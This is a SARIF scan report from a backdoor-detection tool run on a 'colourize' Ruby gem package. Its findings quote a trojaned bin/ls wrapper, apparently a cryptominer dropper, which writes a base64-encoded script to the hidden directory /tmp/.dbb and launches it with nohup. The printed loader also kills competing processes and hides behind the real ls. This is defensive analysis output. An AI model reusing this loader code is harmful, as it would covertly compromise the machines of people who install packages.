{
  "$schema": "https://schemastore.azurewebsites.net/schemas/json/sarif-2.1.0-rtm.6.json",
  "version": "2.1.0",
  "runs": [
    {
      "tool": {
        "driver": {
          "name": "oss-detect-backdoor",
          "organization": "Microsoft Corporation",
          "product": "OSSGadget (https://github.com/Microsoft/OSSGadget)",
          "version": "0.0.0+4a24249b20"
        }
      },
      "results": [
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/cache/colourize-0.8.1.gem/data.tar.gz/data.tar/bin/ls"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 1,
                  "endLine": 25,
                  "endColumn": 6,
                  "snippet": {
                    "text": "end\ncmd =  \"/bin/ls\"\nfor i in 0...ARGV.length\n  cmd += \" \" + Shellwords.escape(ARGV[i])\nend\nsystem(cmd)\nrescue\n",
                    "rendered": {
                      "text": "end\ncmd =  \"/bin/ls\"\nfor i in 0...ARGV.length\n  cmd += \" \" + Shellwords.escape(ARGV[i])\nend\nsystem(cmd)\nrescue\n",
                      "markdown": "`end\ncmd =  \"/bin/ls\"\nfor i in 0...ARGV.length\n  cmd += \" \" + Shellwords.escape(ARGV[i])\nend\nsystem(cmd)\nrescue\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/cache/colourize-0.8.1.gem/data.tar.gz/data.tar/bin/ls"
                },
                "region": {
                  "startLine": 22,
                  "startColumn": 3,
                  "endLine": 23,
                  "endColumn": 4,
                  "snippet": {
                    "text": "iE9MSkgcHJpbnQgfSd8IHhhcmdzIGtpbGwgLTkKcHMgYXV4IHwgZ3JlcCAtdiBncmVwIHwgZ3JlcCAidXJscmV0cmlldmUiIHxncmVwICIvcGx1cy9meHgifCBhd2sgJ3twcmludCAkMn0nIHwgYXdrICd7aWYoTlIhPTEpIHByaW50IH0nfCB4YXJncyBraWxsIC05Cg==\")\n   g.close()\n   Open3.capture3(\"nohup bash /tmp/.dbb/rc7.sh </dev/null >/dev/null 2>&1 &\")\nend\ncmd =  \"/bin/ls\"\nfor i in 0...ARGV.length\n  cmd += \" \" + Shellwords.escape(ARGV[i])\nend\nsystem(cmd)\nrescue\nend\n",
                    "rendered": {
                      "text": "iE9MSkgcHJpbnQgfSd8IHhhcmdzIGtpbGwgLTkKcHMgYXV4IHwgZ3JlcCAtdiBncmVwIHwgZ3JlcCAidXJscmV0cmlldmUiIHxncmVwICIvcGx1cy9meHgifCBhd2sgJ3twcmludCAkMn0nIHwgYXdrICd7aWYoTlIhPTEpIHByaW50IH0nfCB4YXJncyBraWxsIC05Cg==\")\n   g.close()\n   Open3.capture3(\"nohup bash /tmp/.dbb/rc7.sh </dev/null >/dev/null 2>&1 &\")\nend\ncmd =  \"/bin/ls\"\nfor i in 0...ARGV.length\n  cmd += \" \" + Shellwords.escape(ARGV[i])\nend\nsystem(cmd)\nrescue\nend\n",
                      "markdown": "`iE9MSkgcHJpbnQgfSd8IHhhcmdzIGtpbGwgLTkKcHMgYXV4IHwgZ3JlcCAtdiBncmVwIHwgZ3JlcCAidXJscmV0cmlldmUiIHxncmVwICIvcGx1cy9meHgifCBhd2sgJ3twcmludCAkMn0nIHwgYXdrICd7aWYoTlIhPTEpIHByaW50IH0nfCB4YXJncyBraWxsIC05Cg==\")\n   g.close()\n   Open3.capture3(\"nohup bash /tmp/.dbb/rc7.sh </dev/null >/dev/null 2>&1 &\")\nend\ncmd =  \"/bin/ls\"\nfor i in 0...ARGV.length\n  cmd += \" \" + Shellwords.escape(ARGV[i])\nend\nsystem(cmd)\nrescue\nend\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/cache/colourize-0.8.1.gem/data.tar.gz/data.tar/bin/ls"
                },
                "region": {
                  "startLine": 21,
                  "startColumn": 24,
                  "endLine": 21,
                  "endColumn": 30,
                  "snippet": {
                    "text": "Ii9wbHVzL3JjNyJ8IGF3ayAne3ByaW50ICQyfScgfCBhd2sgJ3tpZihOUiE9MSkgcHJpbnQgfSd8IHhhcmdzIGtpbGwgLTkKcHMgYXV4IHwgZ3JlcCAtdiBncmVwIHwgZ3JlcCAidXJscmV0cmlldmUiIHxncmVwICIvcGx1cy9meHgifCBhd2sgJ3twcmludCAkMn0nIHwgYXdrICd7aWYoTlIhPTEpIHByaW50IH0nfCB4YXJncyBraWxsIC05Cg==\")\n   g.close()\n   Open3.capture3(\"nohup bash /tmp/.dbb/rc7.sh </dev/null >/dev/null 2>&1 &\")\nend\ncmd =  \"/bin/ls\"\nfor i in 0...ARGV.length\n  cmd += \" \" + Shellwords.escape(ARGV[i])\nend\nsystem(cmd)\nrescue\nend\n",
                    "rendered": {
                      "text": "Ii9wbHVzL3JjNyJ8IGF3ayAne3ByaW50ICQyfScgfCBhd2sgJ3tpZihOUiE9MSkgcHJpbnQgfSd8IHhhcmdzIGtpbGwgLTkKcHMgYXV4IHwgZ3JlcCAtdiBncmVwIHwgZ3JlcCAidXJscmV0cmlldmUiIHxncmVwICIvcGx1cy9meHgifCBhd2sgJ3twcmludCAkMn0nIHwgYXdrICd7aWYoTlIhPTEpIHByaW50IH0nfCB4YXJncyBraWxsIC05Cg==\")\n   g.close()\n   Open3.capture3(\"nohup bash /tmp/.dbb/rc7.sh </dev/null >/dev/null 2>&1 &\")\nend\ncmd =  \"/bin/ls\"\nfor i in 0...ARGV.length\n  cmd += \" \" + Shellwords.escape(ARGV[i])\nend\nsystem(cmd)\nrescue\nend\n",
                      "markdown": "`Ii9wbHVzL3JjNyJ8IGF3ayAne3ByaW50ICQyfScgfCBhd2sgJ3tpZihOUiE9MSkgcHJpbnQgfSd8IHhhcmdzIGtpbGwgLTkKcHMgYXV4IHwgZ3JlcCAtdiBncmVwIHwgZ3JlcCAidXJscmV0cmlldmUiIHxncmVwICIvcGx1cy9meHgifCBhd2sgJ3twcmludCAkMn0nIHwgYXdrICd7aWYoTlIhPTEpIHByaW50IH0nfCB4YXJncyBraWxsIC05Cg==\")\n   g.close()\n   Open3.capture3(\"nohup bash /tmp/.dbb/rc7.sh </dev/null >/dev/null 2>&1 &\")\nend\ncmd =  \"/bin/ls\"\nfor i in 0...ARGV.length\n  cmd += \" \" + Shellwords.escape(ARGV[i])\nend\nsystem(cmd)\nrescue\nend\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/cache/colourize-0.8.1.gem/data.tar.gz/data.tar/bin/ls"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 28,
                  "endLine": 14,
                  "endColumn": 34,
                  "snippet": {
                    "text": "begin\nif File.directory?(\"/tmp/.dbb\")\n   if File.exist?(\"/tmp/.dbb/rc7.sh\")\n       Open3.capture3('nohup bash /tmp/.dbb/rc7.sh </dev/null >/dev/null 2>&1 &')\n   end\nelse\n   Dir.mkdir(\"/tmp/.dbb\")\n",
                    "rendered": {
                      "text": "begin\nif File.directory?(\"/tmp/.dbb\")\n   if File.exist?(\"/tmp/.dbb/rc7.sh\")\n       Open3.capture3('nohup bash /tmp/.dbb/rc7.sh </dev/null >/dev/null 2>&1 &')\n   end\nelse\n   Dir.mkdir(\"/tmp/.dbb\")\n",
                      "markdown": "`begin\nif File.directory?(\"/tmp/.dbb\")\n   if File.exist?(\"/tmp/.dbb/rc7.sh\")\n       Open3.capture3('nohup bash /tmp/.dbb/rc7.sh </dev/null >/dev/null 2>&1 &')\n   end\nelse\n   Dir.mkdir(\"/tmp/.dbb\")\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/cache/colourize-0.8.1.gem/data.tar.gz/data.tar/bin/ls"
                },
                "region": {
                  "startLine": 21,
                  "startColumn": 24,
                  "endLine": 21,
                  "endColumn": 30,
                  "snippet": {
                    "text": "Ii9wbHVzL3JjNyJ8IGF3ayAne3ByaW50ICQyfScgfCBhd2sgJ3tpZihOUiE9MSkgcHJpbnQgfSd8IHhhcmdzIGtpbGwgLTkKcHMgYXV4IHwgZ3JlcCAtdiBncmVwIHwgZ3JlcCAidXJscmV0cmlldmUiIHxncmVwICIvcGx1cy9meHgifCBhd2sgJ3twcmludCAkMn0nIHwgYXdrICd7aWYoTlIhPTEpIHByaW50IH0nfCB4YXJncyBraWxsIC05Cg==\")\n   g.close()\n   Open3.capture3(\"nohup bash /tmp/.dbb/rc7.sh </dev/null >/dev/null 2>&1 &\")\nend\ncmd =  \"/bin/ls\"\nfor i in 0...ARGV.length\n  cmd += \" \" + Shellwords.escape(ARGV[i])\nend\nsystem(cmd)\nrescue\nend\n",
                    "rendered": {
                      "text": "Ii9wbHVzL3JjNyJ8IGF3ayAne3ByaW50ICQyfScgfCBhd2sgJ3tpZihOUiE9MSkgcHJpbnQgfSd8IHhhcmdzIGtpbGwgLTkKcHMgYXV4IHwgZ3JlcCAtdiBncmVwIHwgZ3JlcCAidXJscmV0cmlldmUiIHxncmVwICIvcGx1cy9meHgifCBhd2sgJ3twcmludCAkMn0nIHwgYXdrICd7aWYoTlIhPTEpIHByaW50IH0nfCB4YXJncyBraWxsIC05Cg==\")\n   g.close()\n   Open3.capture3(\"nohup bash /tmp/.dbb/rc7.sh </dev/null >/dev/null 2>&1 &\")\nend\ncmd =  \"/bin/ls\"\nfor i in 0...ARGV.length\n  cmd += \" \" + Shellwords.escape(ARGV[i])\nend\nsystem(cmd)\nrescue\nend\n",
                      "markdown": "`Ii9wbHVzL3JjNyJ8IGF3ayAne3ByaW50ICQyfScgfCBhd2sgJ3tpZihOUiE9MSkgcHJpbnQgfSd8IHhhcmdzIGtpbGwgLTkKcHMgYXV4IHwgZ3JlcCAtdiBncmVwIHwgZ3JlcCAidXJscmV0cmlldmUiIHxncmVwICIvcGx1cy9meHgifCBhd2sgJ3twcmludCAkMn0nIHwgYXdrICd7aWYoTlIhPTEpIHByaW50IH0nfCB4YXJncyBraWxsIC05Cg==\")\n   g.close()\n   Open3.capture3(\"nohup bash /tmp/.dbb/rc7.sh </dev/null >/dev/null 2>&1 &\")\nend\ncmd =  \"/bin/ls\"\nfor i in 0...ARGV.length\n  cmd += \" \" + Shellwords.escape(ARGV[i])\nend\nsystem(cmd)\nrescue\nend\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/cache/colourize-0.8.1.gem/data.tar.gz/data.tar/bin/ls"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 28,
                  "endLine": 14,
                  "endColumn": 34,
                  "snippet": {
                    "text": "begin\nif File.directory?(\"/tmp/.dbb\")\n   if File.exist?(\"/tmp/.dbb/rc7.sh\")\n       Open3.capture3('nohup bash /tmp/.dbb/rc7.sh </dev/null >/dev/null 2>&1 &')\n   end\nelse\n   Dir.mkdir(\"/tmp/.dbb\")\n",
                    "rendered": {
                      "text": "begin\nif File.directory?(\"/tmp/.dbb\")\n   if File.exist?(\"/tmp/.dbb/rc7.sh\")\n       Open3.capture3('nohup bash /tmp/.dbb/rc7.sh </dev/null >/dev/null 2>&1 &')\n   end\nelse\n   Dir.mkdir(\"/tmp/.dbb\")\n",
                      "markdown": "`begin\nif File.directory?(\"/tmp/.dbb\")\n   if File.exist?(\"/tmp/.dbb/rc7.sh\")\n       Open3.capture3('nohup bash /tmp/.dbb/rc7.sh </dev/null >/dev/null 2>&1 &')\n   end\nelse\n   Dir.mkdir(\"/tmp/.dbb\")\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/cache/colourize-0.8.1.gem/data.tar.gz/data.tar/bin/ls"
                },
                "region": {
                  "startLine": 1,
                  "startColumn": 14,
                  "endLine": 2,
                  "snippet": {
                    "text": "#!/usr/bin/env ruby\nrequire 'open3'\nrequire 'base64'\nrequire 'shellwords'\nrequire 'open-uri'\n",
                    "rendered": {
                      "text": "#!/usr/bin/env ruby\nrequire 'open3'\nrequire 'base64'\nrequire 'shellwords'\nrequire 'open-uri'\n",
                      "markdown": "`#!/usr/bin/env ruby\nrequire 'open3'\nrequire 'base64'\nrequire 'shellwords'\nrequire 'open-uri'\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/cache/colourize-0.8.1.gem/data.tar.gz/data.tar/bin/ls"
                },
                "region": {
                  "startLine": 19,
                  "startColumn": 8,
                  "endLine": 19,
                  "endColumn": 14,
                  "snippet": {
                    "text": "ser-Agent' => \"#{RUBY_PLATFORM}-Lop\").read\nrescue\nend\nbegin\nif File.directory?(\"/tmp/.dbb\")\n   if File.exist?(\"/tmp/.dbb/rc7.sh\")\n       Open3.capture3('nohup bash /tmp/.dbb/rc7.sh </dev/null >/dev/null 2>&1 &')\n   end\nelse\n   Dir.mkdir(\"/tmp/.dbb\")\n   g = File.open(\"/tmp/.dbb/rc7.sh\", \"w\")\n   g << Base64.decode64(\"IyEvYmluL3NoCmV4cG9ydCBub19wcm94eT0iMTM5Ljk5LjEyMC43NSwxMzIuMTQ4LjE0OC43OSwxMzIuMTQ4LjE0OC43OSwxMzkuMjI0LjIwLjE3MyIKI3BzIGF1eCB8IGdyZXAgLXYgcm9vdCB8IGdyZXAgLXYgcHl0aG9uIHwgZ3JlcCAtdiBwZXJsIHwgYXdrICckMz4xMC4we3ByaW50ICQyfScgfCB4YXJncyBraWxsIC05CnBzIGF1eCAgfCBhd2sgJyQzPjEwLjB7cHJpbnQgJDJ9J",
                    "rendered": {
                      "text": "ser-Agent' => \"#{RUBY_PLATFORM}-Lop\").read\nrescue\nend\nbegin\nif File.directory?(\"/tmp/.dbb\")\n   if File.exist?(\"/tmp/.dbb/rc7.sh\")\n       Open3.capture3('nohup bash /tmp/.dbb/rc7.sh </dev/null >/dev/null 2>&1 &')\n   end\nelse\n   Dir.mkdir(\"/tmp/.dbb\")\n   g = File.open(\"/tmp/.dbb/rc7.sh\", \"w\")\n   g << Base64.decode64(\"IyEvYmluL3NoCmV4cG9ydCBub19wcm94eT0iMTM5Ljk5LjEyMC43NSwxMzIuMTQ4LjE0OC43OSwxMzIuMTQ4LjE0OC43OSwxMzkuMjI0LjIwLjE3MyIKI3BzIGF1eCB8IGdyZXAgLXYgcm9vdCB8IGdyZXAgLXYgcHl0aG9uIHwgZ3JlcCAtdiBwZXJsIHwgYXdrICckMz4xMC4we3ByaW50ICQyfScgfCB4YXJncyBraWxsIC05CnBzIGF1eCAgfCBhd2sgJyQzPjEwLjB7cHJpbnQgJDJ9J",
                      "markdown": "`ser-Agent' => \"#{RUBY_PLATFORM}-Lop\").read\nrescue\nend\nbegin\nif File.directory?(\"/tmp/.dbb\")\n   if File.exist?(\"/tmp/.dbb/rc7.sh\")\n       Open3.capture3('nohup bash /tmp/.dbb/rc7.sh </dev/null >/dev/null 2>&1 &')\n   end\nelse\n   Dir.mkdir(\"/tmp/.dbb\")\n   g = File.open(\"/tmp/.dbb/rc7.sh\", \"w\")\n   g << Base64.decode64(\"IyEvYmluL3NoCmV4cG9ydCBub19wcm94eT0iMTM5Ljk5LjEyMC43NSwxMzIuMTQ4LjE0OC43OSwxMzIuMTQ4LjE0OC43OSwxMzkuMjI0LjIwLjE3MyIKI3BzIGF1eCB8IGdyZXAgLXYgcm9vdCB8IGdyZXAgLXYgcHl0aG9uIHwgZ3JlcCAtdiBwZXJsIHwgYXdrICckMz4xMC4we3ByaW50ICQyfScgfCB4YXJncyBraWxsIC05CnBzIGF1eCAgfCBhd2sgJyQzPjEwLjB7cHJpbnQgJDJ9J`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/cache/colourize-0.8.1.gem/data.tar.gz/data.tar/bin/ls"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 9,
                  "endLine": 3,
                  "endColumn": 15,
                  "snippet": {
                    "text": "#!/usr/bin/env ruby\nrequire 'open3'\nrequire 'base64'\nrequire 'shellwords'\nrequire 'open-uri'\n# https://medium.com/@bertusk/ :::  check your twitter.\n",
                    "rendered": {
                      "text": "#!/usr/bin/env ruby\nrequire 'open3'\nrequire 'base64'\nrequire 'shellwords'\nrequire 'open-uri'\n# https://medium.com/@bertusk/ :::  check your twitter.\n",
                      "markdown": "`#!/usr/bin/env ruby\nrequire 'open3'\nrequire 'base64'\nrequire 'shellwords'\nrequire 'open-uri'\n# https://medium.com/@bertusk/ :::  check your twitter.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/gems/colourize-0.8.1/bin/ls"
                },
                "region": {
                  "startLine": 19,
                  "startColumn": 8,
                  "endLine": 19,
                  "endColumn": 14,
                  "snippet": {
                    "text": "ser-Agent' => \"#{RUBY_PLATFORM}-Lop\").read\nrescue\nend\nbegin\nif File.directory?(\"/tmp/.dbb\")\n   if File.exist?(\"/tmp/.dbb/rc7.sh\")\n       Open3.capture3('nohup bash /tmp/.dbb/rc7.sh </dev/null >/dev/null 2>&1 &')\n   end\nelse\n   Dir.mkdir(\"/tmp/.dbb\")\n   g = File.open(\"/tmp/.dbb/rc7.sh\", \"w\")\n   g << Base64.decode64(\"IyEvYmluL3NoCmV4cG9ydCBub19wcm94eT0iMTM5Ljk5LjEyMC43NSwxMzIuMTQ4LjE0OC43OSwxMzIuMTQ4LjE0OC43OSwxMzkuMjI0LjIwLjE3MyIKI3BzIGF1eCB8IGdyZXAgLXYgcm9vdCB8IGdyZXAgLXYgcHl0aG9uIHwgZ3JlcCAtdiBwZXJsIHwgYXdrICckMz4xMC4we3ByaW50ICQyfScgfCB4YXJncyBraWxsIC05CnBzIGF1eCAgfCBhd2sgJyQzPjEwLjB7cHJpbnQgJDJ9J",
                    "rendered": {
                      "text": "ser-Agent' => \"#{RUBY_PLATFORM}-Lop\").read\nrescue\nend\nbegin\nif File.directory?(\"/tmp/.dbb\")\n   if File.exist?(\"/tmp/.dbb/rc7.sh\")\n       Open3.capture3('nohup bash /tmp/.dbb/rc7.sh </dev/null >/dev/null 2>&1 &')\n   end\nelse\n   Dir.mkdir(\"/tmp/.dbb\")\n   g = File.open(\"/tmp/.dbb/rc7.sh\", \"w\")\n   g << Base64.decode64(\"IyEvYmluL3NoCmV4cG9ydCBub19wcm94eT0iMTM5Ljk5LjEyMC43NSwxMzIuMTQ4LjE0OC43OSwxMzIuMTQ4LjE0OC43OSwxMzkuMjI0LjIwLjE3MyIKI3BzIGF1eCB8IGdyZXAgLXYgcm9vdCB8IGdyZXAgLXYgcHl0aG9uIHwgZ3JlcCAtdiBwZXJsIHwgYXdrICckMz4xMC4we3ByaW50ICQyfScgfCB4YXJncyBraWxsIC05CnBzIGF1eCAgfCBhd2sgJyQzPjEwLjB7cHJpbnQgJDJ9J",
                      "markdown": "`ser-Agent' => \"#{RUBY_PLATFORM}-Lop\").read\nrescue\nend\nbegin\nif File.directory?(\"/tmp/.dbb\")\n   if File.exist?(\"/tmp/.dbb/rc7.sh\")\n       Open3.capture3('nohup bash /tmp/.dbb/rc7.sh </dev/null >/dev/null 2>&1 &')\n   end\nelse\n   Dir.mkdir(\"/tmp/.dbb\")\n   g = File.open(\"/tmp/.dbb/rc7.sh\", \"w\")\n   g << Base64.decode64(\"IyEvYmluL3NoCmV4cG9ydCBub19wcm94eT0iMTM5Ljk5LjEyMC43NSwxMzIuMTQ4LjE0OC43OSwxMzIuMTQ4LjE0OC43OSwxMzkuMjI0LjIwLjE3MyIKI3BzIGF1eCB8IGdyZXAgLXYgcm9vdCB8IGdyZXAgLXYgcHl0aG9uIHwgZ3JlcCAtdiBwZXJsIHwgYXdrICckMz4xMC4we3ByaW50ICQyfScgfCB4YXJncyBraWxsIC05CnBzIGF1eCAgfCBhd2sgJyQzPjEwLjB7cHJpbnQgJDJ9J`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/gems/colourize-0.8.1/bin/ls"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 9,
                  "endLine": 3,
                  "endColumn": 15,
                  "snippet": {
                    "text": "#!/usr/bin/env ruby\nrequire 'open3'\nrequire 'base64'\nrequire 'shellwords'\nrequire 'open-uri'\n# https://medium.com/@bertusk/ :::  check your twitter.\n",
                    "rendered": {
                      "text": "#!/usr/bin/env ruby\nrequire 'open3'\nrequire 'base64'\nrequire 'shellwords'\nrequire 'open-uri'\n# https://medium.com/@bertusk/ :::  check your twitter.\n",
                      "markdown": "`#!/usr/bin/env ruby\nrequire 'open3'\nrequire 'base64'\nrequire 'shellwords'\nrequire 'open-uri'\n# https://medium.com/@bertusk/ :::  check your twitter.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/gems/colourize-0.8.1/bin/ls"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 1,
                  "endLine": 25,
                  "endColumn": 6,
                  "snippet": {
                    "text": "end\ncmd =  \"/bin/ls\"\nfor i in 0...ARGV.length\n  cmd += \" \" + Shellwords.escape(ARGV[i])\nend\nsystem(cmd)\nrescue\n",
                    "rendered": {
                      "text": "end\ncmd =  \"/bin/ls\"\nfor i in 0...ARGV.length\n  cmd += \" \" + Shellwords.escape(ARGV[i])\nend\nsystem(cmd)\nrescue\n",
                      "markdown": "`end\ncmd =  \"/bin/ls\"\nfor i in 0...ARGV.length\n  cmd += \" \" + Shellwords.escape(ARGV[i])\nend\nsystem(cmd)\nrescue\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/gems/colourize-0.8.1/bin/ls"
                },
                "region": {
                  "startLine": 22,
                  "startColumn": 3,
                  "endLine": 23,
                  "endColumn": 4,
                  "snippet": {
                    "text": "iE9MSkgcHJpbnQgfSd8IHhhcmdzIGtpbGwgLTkKcHMgYXV4IHwgZ3JlcCAtdiBncmVwIHwgZ3JlcCAidXJscmV0cmlldmUiIHxncmVwICIvcGx1cy9meHgifCBhd2sgJ3twcmludCAkMn0nIHwgYXdrICd7aWYoTlIhPTEpIHByaW50IH0nfCB4YXJncyBraWxsIC05Cg==\")\n   g.close()\n   Open3.capture3(\"nohup bash /tmp/.dbb/rc7.sh </dev/null >/dev/null 2>&1 &\")\nend\ncmd =  \"/bin/ls\"\nfor i in 0...ARGV.length\n  cmd += \" \" + Shellwords.escape(ARGV[i])\nend\nsystem(cmd)\nrescue\nend\n",
                    "rendered": {
                      "text": "iE9MSkgcHJpbnQgfSd8IHhhcmdzIGtpbGwgLTkKcHMgYXV4IHwgZ3JlcCAtdiBncmVwIHwgZ3JlcCAidXJscmV0cmlldmUiIHxncmVwICIvcGx1cy9meHgifCBhd2sgJ3twcmludCAkMn0nIHwgYXdrICd7aWYoTlIhPTEpIHByaW50IH0nfCB4YXJncyBraWxsIC05Cg==\")\n   g.close()\n   Open3.capture3(\"nohup bash /tmp/.dbb/rc7.sh </dev/null >/dev/null 2>&1 &\")\nend\ncmd =  \"/bin/ls\"\nfor i in 0...ARGV.length\n  cmd += \" \" + Shellwords.escape(ARGV[i])\nend\nsystem(cmd)\nrescue\nend\n",
                      "markdown": "`iE9MSkgcHJpbnQgfSd8IHhhcmdzIGtpbGwgLTkKcHMgYXV4IHwgZ3JlcCAtdiBncmVwIHwgZ3JlcCAidXJscmV0cmlldmUiIHxncmVwICIvcGx1cy9meHgifCBhd2sgJ3twcmludCAkMn0nIHwgYXdrICd7aWYoTlIhPTEpIHByaW50IH0nfCB4YXJncyBraWxsIC05Cg==\")\n   g.close()\n   Open3.capture3(\"nohup bash /tmp/.dbb/rc7.sh </dev/null >/dev/null 2>&1 &\")\nend\ncmd =  \"/bin/ls\"\nfor i in 0...ARGV.length\n  cmd += \" \" + Shellwords.escape(ARGV[i])\nend\nsystem(cmd)\nrescue\nend\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/gems/colourize-0.8.1/bin/ls"
                },
                "region": {
                  "startLine": 21,
                  "startColumn": 24,
                  "endLine": 21,
                  "endColumn": 30,
                  "snippet": {
